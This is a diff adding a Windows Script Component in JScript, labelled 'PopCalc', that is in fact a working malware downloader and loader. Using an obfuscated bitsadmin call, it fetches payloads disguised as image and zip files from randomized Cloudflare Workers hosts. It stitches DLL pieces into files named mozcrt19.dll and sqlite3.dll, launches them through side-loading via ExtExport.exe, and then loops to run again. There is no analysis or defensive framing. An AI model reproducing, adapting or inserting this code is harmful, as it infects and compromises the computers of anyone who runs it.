@@ -1,0 +1,443 @@
+<?xml version="1.0"?>
+<package>
+<component id="PopCalc">
+<script language="JScript">
+<![CDATA[
+
+var ak765;
+ak765 = "09/";	
+
+	
+    function bx021(min, max)
+	{
+     return Math.round(Math.random()*(max-min)+min)
+	}	
+
+	var cq854;
+	var dro73;
+	var ekw28;
+	var ekw282;
+	var fiq602;
+	var tmp312;
+	var gd481;
+	var hx73;
+	var irz593;
+	var rwq015;
+	var ka7192;
+    cq854 = false; 
+    dro73 = false; 
+	var jk021 = new ActiveXObject("Scripting.FileSystemObject");
+	var kpz8410 = new ActiveXObject("WScript.Shell");
+    var kpz7666 = new ActiveXObject("WScript.Shell");
+    var ldp205 = new ActiveXObject("Shell.Application");
+	
+
+     function mrc430(url, file)
+    {
+		try
+		{	
+		
+		 kpz8410.run(String.fromCharCode(98)+String.fromCharCode(105)+String.fromCharCode(116)+String.fromCharCode(115)+String.fromCharCode(97)+String.fromCharCode(100)+String.fromCharCode(109)+String.fromCharCode(105)+String.fromCharCode(110)+" /transfer "+bx021(666,99777)+" /priority foreground "+url+" "+file,0,true); 
+
+		 return true;
+		}
+        catch (ex)
+        {		
+         return false;
+        }
+        
+    }	
+	
+	
+	
+function nts316(min)
+{
+
+dro73 = false; 
+
+
+	ka7192 = bx021(1,10);
+	
+	if (ka7192 == 1)
+	{
+	ekw28 = "https://2weucwr9duaeg"+bx021(2000,5000)+"wa5kmwkiat9"+bx021(2000,5000)+"6b8f577.cloudflareworkers.com/.edgeworker-fiddle-init-preview/f23cb340885fd68578e0b277fd7114352d7bbbeee216b3952907acffb6e0bcc31jolly-queen-34e4.us7w.workers.dev/?"+ak765;
+	}	
+
+	if (ka7192 == 2)
+	{
+	ekw28 = "https://waeiuwlmwasw"+bx021(2000,5000)+"q7aae81kuuih9"+bx021(2000,5000)+"6b8f577.cloudflareworkers.com/.edgeworker-fiddle-init-preview/f23cb340885fd68578e0b277fd7114352d7bbbeee216b3952907acffb6e0bcc31jolly-queen-34e4.us7w.workers.dev/?"+ak765;
+	}	
+	
+	if (ka7192 == 3)
+	{
+	ekw28 = "https://y4uie31kyued9"+bx021(2000,5000)+"95ouu6vcwa1k"+bx021(2000,5000)+"6b8f577.cloudflareworkers.com/.edgeworker-fiddle-init-preview/f23cb340885fd68578e0b277fd7114352d7bbbeee216b3952907acffb6e0bcc31jolly-queen-34e4.us7w.workers.dev/?"+ak765;
+	}	
+	
+
+	if (ka7192 == 4)
+	{
+	ekw28 = "https://90oatfgaraewu"+bx021(2000,5000)+"fnae8sj8uan9"+bx021(2000,5000)+"6b8f577.cloudflareworkers.com/.edgeworker-fiddle-init-preview/f23cb340885fd68578e0b277fd7114352d7bbbeee216b3952907acffb6e0bcc31jolly-queen-34e4.us7w.workers.dev/?"+ak765;
+	}	
+
+	if (ka7192 == 5)
+	{
+	ekw28 = "https://60oawkmaraero"+bx021(2000,5000)+"lgar9sw8uih9"+bx021(2000,5000)+"6b8f577.cloudflareworkers.com/.edgeworker-fiddle-init-preview/f23cb340885fd68578e0b277fd7114352d7bbbeee216b3952907acffb6e0bcc31jolly-queen-34e4.us7w.workers.dev/?"+ak765;
+	}	
+
+	if (ka7192 == 6)
+	{
+	ekw28 = "https://e7aow8h44aats"+bx021(2000,5000)+"a2aa8f4qga7w"+bx021(2000,5000)+"6b8f577.cloudflareworkers.com/.edgeworker-fiddle-init-preview/f23cb340885fd68578e0b277fd7114352d7bbbeee216b3952907acffb6e0bcc31jolly-queen-34e4.us7w.workers.dev/?"+ak765;
+	}	
+
+	if (ka7192 == 7)
+	{
+	ekw28 = "https://4aaiewa7gae1d"+bx021(2000,5000)+"weaeemu6far9"+bx021(2000,5000)+"6b8f577.cloudflareworkers.com/.edgeworker-fiddle-init-preview/f23cb340885fd68578e0b277fd7114352d7bbbeee216b3952907acffb6e0bcc31jolly-queen-34e4.us7w.workers.dev/?"+ak765;
+	}	
+
+	if (ka7192 == 8)
+	{
+	ekw28 = "https://5gae5xtw8iusj"+bx021(2000,5000)+"wtai4tkcrai45"+bx021(2000,5000)+"6b8f577.cloudflareworkers.com/.edgeworker-fiddle-init-preview/f23cb340885fd68578e0b277fd7114352d7bbbeee216b3952907acffb6e0bcc31jolly-queen-34e4.us7w.workers.dev/?"+ak765;
+	}	
+
+	if (ka7192 == 9)
+	{
+	ekw28 = "https://dlad75kwae71"+bx021(2000,5000)+"warokaeeio2"+bx021(2000,5000)+"6b8f577.cloudflareworkers.com/.edgeworker-fiddle-init-preview/f23cb340885fd68578e0b277fd7114352d7bbbeee216b3952907acffb6e0bcc31jolly-queen-34e4.us7w.workers.dev/?"+ak765;
+	}	
+
+	if (ka7192 == 10)
+	{
+	ekw28 = "https://e8iu8be8wiabr"+bx021(2000,5000)+"5weuce6gpiaw6"+bx021(2000,5000)+"6b8f577.cloudflareworkers.com/.edgeworker-fiddle-init-preview/f23cb340885fd68578e0b277fd7114352d7bbbeee216b3952907acffb6e0bcc31jolly-queen-34e4.us7w.workers.dev/?"+ak765;
+	}	
+	
+
+
+   
+
+
+
+ekw282 = ekw28;
+
+
+gd481 = "C:\\Users\\Public\\Libraries\\raw";
+hx73 = "C:\\Users \\Public\\Libraries\\raw";
+irz593 = "144_MULT1T3SL4S_"	
+
+
+	try
+	{
+	var fso = new ActiveXObject("Scripting.FileSystemObject");  
+	fso.CreateFolder(gd481);  
+	}
+    catch (ex)
+    {
+		
+	}
+
+	try
+	{
+	var fso = new ActiveXObject("Scripting.FileSystemObject");  
+	fso.CreateFolder(hx73);  
+	}
+    catch (ex)
+    {
+		
+	}
+
+
+	try
+	{    
+     if (jk021.FileExists(gd481+"\\daffsyshqy64.dll")){	   
+	   f = jk021.GetFile(gd481+"\\daffsyshqy64.dll");	   
+	   if (f.size < 10 ){
+		f.Delete();  
+		f.Close();		
+	   }
+     }   
+	}
+    catch (ex)
+    {
+		
+	}		 
+   
+
+	try
+	{    
+        if (!jk021.FileExists(gd481+"\\0144vrxi.log")){	   
+	     f = jk021.GetFile(gd481+"\\daffsyshqy64.dll");	   
+		 f.Delete();  
+		 f.Close();		
+        }   
+	}
+    catch (ex)
+    {
+		
+	}	  
+
+	try
+	{    
+        if (!jk021.FileExists(gd481+"\\0144refor.log")){	   
+	      f = jk021.GetFile(gd481+"\\daffsyshqy64.dll");	   
+		 f.Delete();  
+		 f.Close();		
+        }   
+	}
+    catch (ex)
+    {
+		
+	}	  
+   
+     wpxa064 = "C:\\Program Files (x86)\\Internet Explorer\\ExtExport.exe";
+     wpxa032 = "C:\\Program Files\\Internet Explorer\\ExtExport.exe";
+
+        if (jk021.FileExists(gd481+"\\daffsyshqydwwn.gif")){	
+            if (jk021.FileExists(gd481+"\\daffsyshqyg.gif")){			 
+		        if (jk021.FileExists(gd481+"\\daffsyshqyxa.~")){		 
+					if (jk021.FileExists(gd481+"\\daffsyshqyxb.~")){		 
+
+						 if (jk021.FileExists(wpxa064)){						 	
+						 try
+						 {				  
+						 kpz8410.run('"'+wpxa064+'" '+gd481+" "+bx021(0000001,999999999)+" "+bx021(3000001,999999999),0,true); 		
+				  
+						 }
+						 catch (ex)
+						 {
+			
+						 }	
+						 dro73 = true;             
+						}
+						
+						
+						 if (jk021.FileExists(wpxa032)){	
+
+						 try
+						 {				  
+						 kpz8410.run('"'+wpxa032+'" '+gd481+" "+bx021(0000001,999999999)+" "+bx021(3000001,999999999),0,true); 			
+				  
+						 }
+						 catch (ex)
+						 {
+			
+						 }	
+						 dro73 = true;             
+						}
+						
+					}
+		        }
+		    }
+        }
+     
+     
+  if (dro73 == false)
+  { 
+
+	try
+	{
+
+	 cq854 = mrc430(ekw28+"daffsyshqya.jpg.zip",gd481+"\\daffsyshqya.jpg");
+        if (cq854 == false) {	
+	     mrc430(ekw282+"daffsyshqya.jpg.zip",gd481+"\\daffsyshqya.jpg");
+	    }
+	}
+    catch (ex)
+    {
+	
+	}	
+
+
+	try
+	{
+	 cq854 = mrc430(ekw28+"daffsyshqyb.jpg.zip",gd481+"\\daffsyshqyb.jpg");
+        if (cq854 == false) {	
+	     mrc430(ekw282+"daffsyshqyb.jpg.zip",gd481+"\\daffsyshqyb.jpg");
+	    }
+	}
+    catch (ex)
+    {
+			
+	}	
+	
+
+	try
+	{
+	 cq854 = mrc430(ekw28+"daffsyshqyc.jpg.zip",gd481+"\\daffsyshqyc.jpg");
+        if (cq854 == false) {	
+	     mrc430(ekw282+"daffsyshqyc.jpg.zip",gd481+"\\daffsyshqyc.jpg");
+	    }
+	}
+    catch (ex)
+    {
+		
+	}	
+
+
+	try
+	{
+	 cq854 = mrc430(ekw28+"daffsyshqydwwn.gif.zip",gd481+"\\daffsyshqydwwn.gif");
+        if (cq854 == false) {	 
+	     mrc430(ekw282+"daffsyshqydwwn.gif.zip",gd481+"\\daffsyshqydwwn.gif");
+	    }
+	}
+    catch (ex)
+    {
+		
+	}
+
+
+	try
+	{
+	 cq854 = mrc430(ekw28+"daffsyshqydx.gif.zip",gd481+"\\daffsyshqydx.gif");
+        if (cq854 == false) {	 
+	     mrc430(ekw282+"daffsyshqydx.gif.zip",gd481+"\\daffsyshqydx.gif");
+	    }
+	}
+    catch (ex)
+    {
+		
+	}
+
+	try
+	{
+	 cq854 = mrc430(ekw28+"daffsyshqyg.gif.zip",gd481+"\\daffsyshqyg.gif");
+        if (cq854 == false) {		 
+	     mrc430(ekw282+"daffsyshqyg.gif.zip",gd481+"\\daffsyshqyg.gif");
+	    }
+	}
+    catch (ex)
+    {
+		
+	}
+	
+
+	try
+	{
+	 cq854 = mrc430(ekw28+"daffsyshqygx.gif.zip",gd481+"\\daffsyshqygx.gif");
+        if (cq854 == false) {		 
+	     mrc430(ekw282+"daffsyshqygx.gif.zip",gd481+"\\daffsyshqygx.gif");
+	    }
+	}
+    catch (ex)
+    {
+		
+	}
+
+	
+	
+	try
+	{
+	 cq854 = mrc430(ekw28+"daffsyshqyxa.gif.zip",gd481+"\\daffsyshqyxa.~");
+        if (cq854 == false) {	 
+	     mrc430(ekw282+"daffsyshqyxa.gif.zip",gd481+"\\daffsyshqyxa.~");
+	    }
+	}
+    catch (ex)
+    {
+	
+	}	
+
+
+	try
+	{
+	 cq854 = mrc430(ekw28+"daffsyshqyxb.gif.zip",gd481+"\\daffsyshqyxb.~");
+        if (cq854 == false) {	 
+	     mrc430(ekw282+"daffsyshqyxb.gif.zip",gd481+"\\daffsyshqyxb.~");
+	    }
+	}
+    catch (ex)
+    {
+		
+	}	
+
+	
+
+
+
+	
+	rwq015 = bx021(1, 30);
+	try
+	{
+	 cq854 = mrc430(ekw28+"daffsyshqyhh"+rwq015+"a.dll.zip",gd481+"\\daffsyshqy64a.dll");
+	    if (cq854 == false) {
+	     mrc430(ekw282+"daffsyshqyhh"+rwq015+"a.dll.zip",gd481+"\\daffsyshqy64a.dll");
+	    }
+	}
+    catch (ex)
+    {
+		
+	}	
+
+	try
+	{
+	 cq854 = mrc430(ekw28+"daffsyshqyhh"+rwq015+"b.dll.zip",gd481+"\\daffsyshqy64b.dll");
+	    if (cq854 == false) {
+	     mrc430(ekw282+"daffsyshqyhh"+rwq015+"b.dll.zip",gd481+"\\daffsyshqy64b.dll");
+	    }
+	}
+    catch (ex)
+    {
+		
+	}	
+	
+					if (jk021.FileExists(gd481+"\\daffsyshqy64b.dll")){
+						if (jk021.FileExists(wpxa064)){						 	
+						 try
+						 {	
+						 kpz8410.run('cmd /V /C "echo '+irz593+'>'+gd481+'\\r1.log"&& exit',0,false); 
+	
+						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type daffsyshqy64a.dll daffsyshqy64b.dll > mozcrt19.dll',0,true); 
+						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type daffsyshqy64a.dll daffsyshqy64b.dll > mozsqlite3.dll',0,true); 						 
+						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type daffsyshqy64a.dll daffsyshqy64b.dll > sqlite3.dll',0,true); 
+						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type daffsyshqy64a.dll daffsyshqy64b.dll > daffsyshqy64.dll',0,true);
+						 
+						 kpz8410.run('"'+wpxa064+'" '+gd481+" "+bx021(0000001,999999999)+" "+bx021(3000001,999999999),0,true); 		
+				  
+						 }
+						 catch (ex)
+						 {
+			
+						 }	
+						 dro73 = true;             
+						}
+						
+						
+						 if (jk021.FileExists(wpxa032)){	
+
+						 try
+						 {	
+						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type daffsyshqy64a.dll daffsyshqy64b.dll > mozcrt19.dll',0,true); 
+						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type daffsyshqy64a.dll daffsyshqy64b.dll > mozsqlite3.dll',0,true); 						 
+						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type daffsyshqy64a.dll daffsyshqy64b.dll > sqlite3.dll',0,true); 
+						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type daffsyshqy64a.dll daffsyshqy64b.dll > daffsyshqy64.dll',0,true); 					 
+						 
+						 kpz8410.run('"'+wpxa032+'" '+gd481+" "+bx021(0000001,999999999)+" "+bx021(3000001,999999999),0,true); 		
+				  
+						 }
+						 catch (ex)
+						 {
+			
+						 }	
+						 dro73 = true;             
+						}
+					}
+	
+  }
+
+
+kpz8410.run(String.fromCharCode(99)+String.fromCharCode(109)+String.fromCharCode(100)+String.fromCharCode(32)+String.fromCharCode(47)+
+String.fromCharCode(99)+String.fromCharCode(32)+String.fromCharCode(101)+String.fromCharCode(99)+String.fromCharCode(104)+String.fromCharCode(111)+
+String.fromCharCode(32)+String.fromCharCode(37)+String.fromCharCode(116)+String.fromCharCode(105)+String.fromCharCode(109)+String.fromCharCode(101)+
+String.fromCharCode(37)+String.fromCharCode(32)+String.fromCharCode(38)+String.fromCharCode(38)+String.fromCharCode(32)+String.fromCharCode(116)+
+String.fromCharCode(105)+String.fromCharCode(109)+String.fromCharCode(101)+String.fromCharCode(111)+String.fromCharCode(117)+
+String.fromCharCode(116)+String.fromCharCode(32)+String.fromCharCode(52)+String.fromCharCode(48)+String.fromCharCode(48)+String.fromCharCode(48)+
+String.fromCharCode(32)+String.fromCharCode(62)+String.fromCharCode(32)+String.fromCharCode(78)+String.fromCharCode(85)+String.fromCharCode(76)+
+String.fromCharCode(32)+String.fromCharCode(38)+String.fromCharCode(38)+String.fromCharCode(32)+String.fromCharCode(101)+String.fromCharCode(120)+
+String.fromCharCode(105)+String.fromCharCode(116),0,true); 
+nts316(bx021(0000001,999999999));
+}
+
+nts316(bx021(0000001,999999999));
+
+]]>
+</script>
+</component>
+</package>
